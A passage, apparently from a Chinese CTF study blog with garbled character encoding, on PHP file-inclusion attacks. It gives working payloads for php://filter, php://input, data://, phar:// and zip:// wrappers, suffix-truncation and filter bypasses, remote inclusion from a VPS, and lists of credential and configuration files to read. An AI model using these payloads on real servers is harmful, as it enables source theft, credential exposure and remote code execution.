<span class="literal">false</span>)  &#123;       </span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>æ–‡ç« å…³é”®ï¼š</strong></p>
<p><u><strong>phpçš„æ–‡ä»¶åŒ…å«æœºåˆ¶æ˜¯å°†å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­ï¼Œå½“å·²ç»<code>require_once(&#39;flag.php&#39;)</code>ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†require_onceã€‚</strong></u></p>
<p><u><strong>ä»Šå¤©å°±æ¥è°ˆè°ˆï¼Œæ€ä¹ˆè®¾æƒ³å¦‚ä½•ç»•è¿‡è¿™ä¸ªå“ˆå¸Œè¡¨ï¼Œè®©phpè®¤ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åä¸åœ¨å“ˆå¸Œè¡¨ä¸­ï¼Œåˆå¯ä»¥è®©phpèƒ½æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œè¯»å–åˆ°å†…å®¹ã€‚</strong></u></p>
<p><u><strong>åœ¨è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹ï¼Œ<code>/proc/self</code>æŒ‡å‘å½“å‰è¿›ç¨‹çš„<code>/proc/pid/</code>ï¼Œ<code>/proc/self/root/</code>æ˜¯æŒ‡å‘<code>/</code>çš„ç¬¦å·é“¾æ¥ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡</strong></u></p>
<p>payload:</p>
<p>?d&#x3D;0:&#x2F;&#x2F;labour&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flll1ag2.txt&amp;ctf&#x3D;laiya</p>
<h3 id="2-phpä¼ªåè®®"><a href="#2-phpä¼ªåè®®" class="headerlink" title="2.phpä¼ªåè®®"></a>2.phpä¼ªåè®®</h3><p>å†…å®¹æ¥è‡ªäº<a href="https://blog.csdn.net/qz362228/article/details/124359070">https://blog.csdn.net/qz362228/article/details/124359070</a></p>
<p><img src="/post/Web-study/image-20230803155611860.png" alt="image-20230803155611860"></p>
<h4 id="1-php-åè®®"><a href="#1-php-åè®®" class="headerlink" title="1.php:&#x2F;&#x2F;åè®®"></a>1.php:&#x2F;&#x2F;åè®®</h4><p><strong>Â·æ¡ä»¶ï¼š</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:<span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line">allow_url_include #ä»…php://<span class="keyword">input</span> php://stdin php://memory php://<span class="keyword">temp</span> éœ€è¦<span class="keyword">on</span></span><br></pre></td></tr></table></figure>

<p><strong>Â·ä½œç”¨ï¼š</strong></p>
<blockquote>
<p><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code>ï¼Œ<code>php://filter</code>ç”¨äº<strong>è¯»å–æºç </strong>ï¼Œ<code>php://input</code>ç”¨äº<strong>æ‰§è¡Œphpä»£ç </strong>ã€‚</p>
</blockquote>
<p><strong>Â·è¯´æ˜</strong>ï¼š</p>
<blockquote>
<p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥&#x2F;è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ<br>å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨</p>
</blockquote>
<h4 id="2-php-filterä¼ªåè®®"><a href="#2-php-filterä¼ªåè®®" class="headerlink" title="2.php:&#x2F;&#x2F;filterä¼ªåè®®"></a>2.php:&#x2F;&#x2F;filterä¼ªåè®®</h4><p><strong>Â·æ¡ä»¶</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>åªæ˜¯<code>è¯»å–</code>ï¼Œéœ€è¦å¼€å¯<code>allow_url_fopen</code>ï¼Œä¸éœ€è¦å¼€å¯<code>allow_url_include</code></p>
</blockquote>
<p><strong>Â·è¯´æ˜ï¼š</strong></p>
<blockquote>
<p>å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™<br>â‘ è¾“å‡ºè¿›è¡Œ<code>base64</code>åŠ å¯†åçš„ä¿¡æ¯</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure>

<p>æˆ–</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure>

<p>â‘¡è·å¾—å°†base64åŠ å¯†åçš„ä¿¡æ¯åï¼Œå†å°†å…¶è§£å¯†ï¼Œå¾—å‡ºåŸä¿¡æ¯</p>
</blockquote>
<h5 id="ç»•è¿‡baseè¿‡æ»¤"><a href="#ç»•è¿‡baseè¿‡æ»¤" class="headerlink" title="ç»•è¿‡baseè¿‡æ»¤"></a>ç»•è¿‡baseè¿‡æ»¤</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/string.rot13/</span>resource=flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ROT13 ç¼–ç ç®€å•åœ°ä½¿ç”¨å­—æ¯è¡¨ä¸­åé¢ç¬¬ 13 ä¸ªå­—æ¯æ›¿æ¢å½“å‰å­—æ¯ï¼ŒåŒæ—¶å¿½ç•¥éå­—æ¯è¡¨ä¸­çš„å­—ç¬¦ã€‚</p>
</blockquote>
<h4 id="3-php-inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰"><a href="#3-php-inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰" class="headerlink" title="3.php:&#x2F;&#x2F;inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰"></a>3.php:&#x2F;&#x2F;inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰</h4><p><strong>Â·æ¡ä»¶</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span></span><br></pre></td></tr></table></figure>

<p><strong>Â·è¯´æ˜</strong></p>
<blockquote>
<p>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚åœ¨postè¯·æ±‚ä¸­èƒ½æŸ¥çœ‹è¯·æ±‚çš„åŸå§‹æ•°æ®ï¼Œ<u><strong>å¹¶å°†postè¯·æ±‚ä¸­çš„postæ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œ</strong></u>ã€‚ï¼ˆåªè¯»æµæ˜¯è¯´åªèƒ½è¿›è¡Œè¯»æ“ä½œçš„æ•°æ®ï¼‰</p>
</blockquote>
<p><code>ä¾‹å¦‚</code></p>
<p>ä¸‹é¢çš„POSTæ•°æ®é‡Œçš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œ</p>
<p><img src="/post/Web-study/image-20220801143739625.png" alt="image-20220801143739625"></p>
<blockquote>
<p>å³å¯ä»¥<u>ç›´æ¥è¯»å–åˆ°POSTä¸Š</u>æ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚ <strong>enctype&#x3D;â€multipart&#x2F;form-dataâ€</strong> çš„æ—¶å€™ php:&#x2F;&#x2F;input æ˜¯<strong>æ— æ•ˆ</strong>çš„</p>
</blockquote>
<p><code>æ³¨</code> ï¼š</p>
<blockquote>
<p>æŸ¥çœ‹å½“å‰è¿è¡Œçš„æ˜¯å“ªä¸ªphp.ini<br>2,3éœ€è¦å°†phpå¯æ‰§è¡ŒåŠ å…¥ç¯å¢ƒå˜é‡, å¦‚æœæ²¡æœ‰åŠ ,é‚£ä¹ˆè¯·ä½¿ç”¨phpå¯æ‰§è¡Œæ–‡ä»¶æ‰€åœ¨ä½ç½®çš„å®Œæ•´è·¯å¾„ä»£æ›¿</p>
</blockquote>
<blockquote>
<ol>
<li></li>
</ol>
<p>æ‰“å°å‡º<code>phpinfo();</code> æ‰¾åˆ°<code>Loaded Configuration File</code>é‚£ä¸€è¡Œ</p>
</blockquote>
<p><img src="/post/Web-study/image-20230803154754765.png" alt="image-20230803154754765"></p>
<blockquote>
<ol start="2">
<li></li>
</ol>
<p>å‘½ä»¤è¡Œè¾“å…¥</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">php</span> -<span class="variable">i</span> |<span class="variable">grep</span> <span class="variable">php.ini</span>ï¼ˆ<span class="variable">php</span> -<span class="variable">i</span>å…¶å®å°±æ˜¯è¾“å‡º<span class="function"><span class="title">phpinfo</span>();)</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">php -r â€œphpinfo();â€ <span class="string">|grep php.ini</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="4-file-ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰"><a href="#4-file-ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰" class="headerlink" title="4.file:&#x2F;&#x2F;ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰"></a>4.file:&#x2F;&#x2F;ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰</h4><p>   <strong>Â·æ¡ä»¶</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span> ï¼ˆå‡ä¸å—å½±å“ï¼‰</span><br></pre></td></tr></table></figure>

<p>æ‰“<code>ctf</code>ä¸­å¸¸ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>:<span class="comment">//C:\Windows\System32\drivers\etc\hosts</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/Web-study/image-20230803154806812.png" alt="image-20230803154806812"></p>
<h4 id="5-phar-ä¼ªåè®®-è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹"><a href="#5-phar-ä¼ªåè®®-è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹" class="headerlink" title="5.phar:&#x2F;&#x2F;ä¼ªåè®®(è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹)"></a>5.phar:&#x2F;&#x2F;ä¼ªåè®®(è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹)</h4><p><strong>Â·æ¡ä»¶</strong></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (å‡ä¸å—å½±å“)</span><br></pre></td></tr></table></figure>

<p><code>æ³¨</code>ï¼š</p>
<blockquote>
<p>php ç‰ˆæœ¬å¤§äºç­‰äº<code>5.3.0</code>ï¼Œå‹ç¼©åŒ…éœ€è¦æ˜¯<code>zip</code>åè®®å‹ç¼©ï¼Œ<code>rar</code>ä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚</p>
</blockquote>
<p><strong>Â·æ ¼å¼</strong></p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=phar:<span class="comment">//å‹ç¼©åŒ…å/å†…éƒ¨æ–‡ä»¶å</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹ï¼Œ</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">phar:</span><span class="comment">//x.zip/x.php</span></span><br></pre></td></tr></table></figure>

<h4 id="6-zip-ä¼ªåè®®"><a href="#6-zip-ä¼ªåè®®" class="headerlink" title="6.zip:&#x2F;&#x2F;ä¼ªåè®®"></a>6.zip:&#x2F;&#x2F;ä¼ªåè®®</h4><blockquote>
<p>zipä¼ªåè®®å’Œpharåè®®ç±»ä¼¼ï¼Œä½†æ˜¯ç”¨æ³•ä¸ä¸€æ ·ï¼ˆurlä¸åŒï¼‰</p>
</blockquote>
<p><strong>Â·æ¡ä»¶</strong></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="symbol">allow_url_fopen:</span> <span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line"><span class="symbol">allow_url_include:</span> <span class="keyword">off</span>/<span class="keyword">on</span> (å‡ä¸å—å½±å“)</span><br></pre></td></tr></table></figure>

<p><strong>Â·æ ¼å¼</strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">zip</span>:<span class="comment">//[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹ï¼Œ</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">zip:</span>//D:\phpstudy\WWW\<span class="keyword">x</span>.zip<span class="variable">%23</span>shell.php       #-&gt;<span class="variable">%23</span></span><br></pre></td></tr></table></figure>

<h4 id="7-data-ä¼ªåè®®-è¯»å–æ–‡ä»¶"><a href="#7-data-ä¼ªåè®®-è¯»å–æ–‡ä»¶" class="headerlink" title="7.data:&#x2F;&#x2F;ä¼ªåè®®(è¯»å–æ–‡ä»¶)"></a>7.data:&#x2F;&#x2F;ä¼ªåè®®(è¯»å–æ–‡ä»¶)</h4><blockquote>
<p>ï¼ˆå¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼‰<br>å’Œ<code>php://input</code>å¾ˆåƒï¼Œ<code>php://input</code>ä»¥<code>post</code>æäº¤æ•°æ®é‚£æ ·æäº¤æ•°æ®ï¼Œ<br><code>data://</code>æ˜¯ä»¥<code>get</code>æ–¹å¼æäº¤æ•°æ®ï¼Œä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œæäº¤çš„è„šæœ¬</p>
</blockquote>
<p><strong>Â·æ ¼å¼</strong></p>
<blockquote>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo()<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data://text/plain;<span class="built_in">base64</span>,<span class="built_in">base64</span>åŠ å¯†çš„ä»£ç </span><br></pre></td></tr></table></figure>

<p>å¯é…åˆ<a href="https://www.cnblogs.com/xiaozi/p/7831529.html">phpå‘½ä»¤æ‰§è¡Œæ¼æ´</a>ï¼Œå®ç°å¯¹ä¸€äº›æ•°æ®çš„è·å–<br>å¦‚ï¼š<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
</blockquote>
<h4 id="8-æ€»ç»“"><a href="#8-æ€»ç»“" class="headerlink" title="8.æ€»ç»“"></a>8.æ€»ç»“</h4><blockquote>
<p><a href="https://blog.csdn.net/dreamthe/article/details/121765876">å‚è€ƒå®ä¾‹1</a></p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/106658417">å‚è€ƒå®ä¾‹2</a></p>
</blockquote>
<h3 id="3-ç»•è¿‡"><a href="#3-ç»•è¿‡" class="headerlink" title="3.ç»•è¿‡"></a>3.ç»•è¿‡</h3><h4 id="1ï¼‰è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€"><a href="#1ï¼‰è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€" class="headerlink" title="1ï¼‰è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€"></a>1ï¼‰è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=@$_GET[<span class="string">&#x27;123&#x27;</span>];</span><br><span class="line"><span class="title function_">include</span>($a.<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœé™åˆ¶äº†æ–‡ä»¶ç±»å‹ï¼Œæ¯”å¦‚è¿™é‡Œåªèƒ½åŒ…å«<code>html</code>åç¼€çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•</p>
<p><code>æ“ä½œç³»ç»Ÿå­˜åœ¨æœ€å¤§è·¯å¾„é•¿åº¦çš„é™åˆ¶</code></p>
<blockquote>
<p>windowsç³»ç»Ÿï¼Œæ–‡ä»¶åæœ€é•¿256ä¸ªå­—ç¬¦</p>
<p>linuxç³»ç»Ÿï¼Œæ–‡ä»¶åæœ€é•¿4096ä¸ªå­—ç¬¦(æµè§ˆå™¨æœ€å¤šåªèƒ½è¾“å…¥300å¤šä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…)<br>å‰é¢åŠ .&#x2F;.&#x2F;.&#x2F;.&#x2F;â€¦â€¦â€¦â€¦xx.php</p>
</blockquote>
<p>å¯ä»¥è¾“å…¥è¶…è¿‡æœ€å¤§è·¯å¾„é•¿åº¦çš„ç›®å½•ï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¼šå°†åé¢çš„è·¯å¾„ä¸¢å¼ƒï¼Œ<code>å¯¼è‡´æ‰©å±•åè¢«ä¸­é€”æˆªæ–­</code></p>
<p>åœ¨æ–‡ä»¶åé¢åŠ <code>.</code> å¦‚ï¼š </p>
<blockquote>
<p>info.phpâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.html</p>
<p><code>.</code>è¶…è¿‡256ä¸ªå°±è¡Œï¼Œåé¢å¤šå‡ºæ¥çš„<code>...........................................html</code>ä¸ä¼šè¢«è¯†åˆ«åˆ°</p>
</blockquote>
<h4 id="2ï¼‰-æˆªæ–­åç¼€"><a href="#2ï¼‰-æˆªæ–­åç¼€" class="headerlink" title="2ï¼‰? æˆªæ–­åç¼€"></a>2ï¼‰? æˆªæ–­åç¼€</h4><p>å¾€å¾€æ–‡ä»¶åŒ…å«ä¸­ä¼šå‡ºç°</p>
<blockquote>
<p><code>(&quot;$file&quot;.&quot;.html&quot;)</code><br>è¿™é‡Œä»¥htmlä¸ºä¾‹å­ï¼Œè¿™æ ·æˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶åç§°å‚æ•°åé¢ç»ˆä¼šè·Ÿä¸Š.htmlåç¼€ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶åŒ…å«å¤±è´¥</p>
<p>è¦æˆªæ–­åç¼€ï¼Œåªéœ€è¦åœ¨æœ«å°¾æ·»åŠ  <code>?</code> å³å¯ï¼Œè¿™æ ·åç¼€å°±ä¼šå˜æˆ URL çš„å‚æ•°</p>
</blockquote>
<h4 id="3ï¼‰-ç‚¹è¢«è¿‡æ»¤ï¼Œç½‘å€-IPæ— æ³•è¾“å…¥"><a href="#3ï¼‰-ç‚¹è¢«è¿‡æ»¤ï¼Œç½‘å€-IPæ— æ³•è¾“å…¥" class="headerlink" title="3ï¼‰.ç‚¹è¢«è¿‡æ»¤ï¼Œç½‘å€&#x2F;IPæ— æ³•è¾“å…¥"></a>3ï¼‰<code>.</code>ç‚¹è¢«è¿‡æ»¤ï¼Œç½‘å€&#x2F;IPæ— æ³•è¾“å…¥</h4><p>ipè½¬é•¿æ•´å‹,é‡Œé¢æœ‰ä¸€å¥è¯æœ¨é©¬,éœ€è¦vps</p>
<blockquote>
<p><a href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p>
</blockquote>
<p>å¦‚å°†IPåœ°å€219.239.110.138è½¬æ¢ä¸ºæ•°å­—ï¼š</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">219</span> * <span class="number">256</span>^<span class="number">3</span> + <span class="number">239</span> * <span class="number">256</span>^<span class="number">2</span> + <span class="number">110</span> * <span class="number">256</span>^<span class="number">1</span> + <span class="number">138</span> * <span class="number">256</span>^<span class="number">0</span> = <span class="number">3689901706</span></span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œ219.239.110.138çš„æ•°å­—åœ°å€ä¸º3689901706ã€‚</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">include <span class="string">&quot;http://3689901706&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="4ï¼‰-è¢«è¿‡æ»¤"><a href="#4ï¼‰-è¢«è¿‡æ»¤" class="headerlink" title="4ï¼‰;è¢«è¿‡æ»¤"></a>4ï¼‰;è¢«è¿‡æ»¤</h4><p>?&gt;é—­åˆä»£ç </p>
<p>å› ä¸º?&gt;å¯ä»¥ä»£æ›¿phpä»£ç ä¸­æœ€åä¸€ä¸ªåˆ†å·çš„ä½œç”¨</p>
<p><img src="/post/Web-study/image-20230803165104978.png" alt="image-20230803165104978"></p>
<h4 id="5ï¼‰å¼ºåˆ¶åŠ åç¼€"><a href="#5ï¼‰å¼ºåˆ¶åŠ åç¼€" class="headerlink" title="5ï¼‰å¼ºåˆ¶åŠ åç¼€"></a>5ï¼‰å¼ºåˆ¶åŠ åç¼€</h4><figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">å¦‚ include($cmd.&quot;.php&quot;)</span></span><br><span class="line"><span class="language-xml">$cmd=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">// åé¢å†æ‹¼æ¥ä¸Š.phpçš„æ—¶å€™ï¼Œç”±äºphpè¯­å¥å·²ç»é—­åˆï¼Œæ‰€ä»¥èµ·ä¸äº†ä»€ä¹ˆä½œç”¨</span></span><br></pre></td></tr></table></figure>

<h4 id="6ï¼‰è·¯å¾„è¿‡æ»¤"><a href="#6ï¼‰è·¯å¾„è¿‡æ»¤" class="headerlink" title="6ï¼‰è·¯å¾„è¿‡æ»¤"></a>6ï¼‰è·¯å¾„è¿‡æ»¤</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">å¦‚replace(<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;&#x27;</span>) ==&gt;</span><br><span class="line">å¯ä»¥ç”¨ ...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>flag</span><br></pre></td></tr></table></figure>

<h3 id="4-æ•æ„Ÿæ–‡ä»¶è·¯å¾„"><a href="#4-æ•æ„Ÿæ–‡ä»¶è·¯å¾„" class="headerlink" title="4.æ•æ„Ÿæ–‡ä»¶è·¯å¾„"></a>4.æ•æ„Ÿæ–‡ä»¶è·¯å¾„</h3><h5 id="è¯»å–ç½‘ç«™é…ç½®æ–‡ä»¶"><a href="#è¯»å–ç½‘ç«™é…ç½®æ–‡ä»¶" class="headerlink" title="è¯»å–ç½‘ç«™é…ç½®æ–‡ä»¶"></a>è¯»å–ç½‘ç«™é…ç½®æ–‡ä»¶</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">dedecms æ•°æ®åº“é…ç½®æ–‡ä»¶ data/common<span class="selector-class">.inc</span><span class="selector-class">.php</span>,</span><br><span class="line">discuz å…¨å±€é…ç½®æ–‡ä»¶ config/config_global<span class="selector-class">.php</span>,</span><br><span class="line">phpcms é…ç½®æ–‡ä»¶ caches/configs/database<span class="selector-class">.php</span></span><br><span class="line">phpwind é…ç½®æ–‡ä»¶ conf/database<span class="selector-class">.php</span></span><br><span class="line">wordpress é…ç½®æ–‡ä»¶ wp-config.php</span><br></pre></td></tr></table></figure>

<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">C:</span>/boot.ini<span class="comment">//æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/System32<span class="keyword">/inetsrv/</span>MetaBase.xml<span class="comment">//IIS é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="symbol">C:</span>/Windows<span class="keyword">/repairsam/</span>/å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </span><br><span class="line"><span class="symbol">C:</span>/Program Files<span class="keyword">/mysql/</span>my.ini<span class="comment">//Mysql é…ç½®</span></span><br><span class="line"><span class="symbol">C:</span>/Program Files<span class="keyword">/mysql/</span>data<span class="keyword">/mysql/</span>user.MYD<span class="comment">//Mysql   root</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/php.ini<span class="comment">//php é…ç½®ä¿¡æ¯</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/my.ini<span class="comment">//Mysql é…ç½®ä¿¡æ¯</span></span><br></pre></td></tr></table></figure>

<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/proc/</span>self/root <span class="comment">#æŒ‡å‘æ ¹ç›®å½•</span></span><br><span class="line"><span class="regexp">/proc/m</span>aps    <span class="comment">#è®°å½•ä¸€äº›è°ƒç”¨çš„æ‹“å±•æˆ–è€…è‡ªå®šä¹‰çš„soæ–‡ä»¶</span></span><br><span class="line"><span class="regexp">/proc/</span>self/environ <span class="comment">#ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="regexp">/proc/</span>environ  <span class="comment">#ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="regexp">/proc/</span>comm    <span 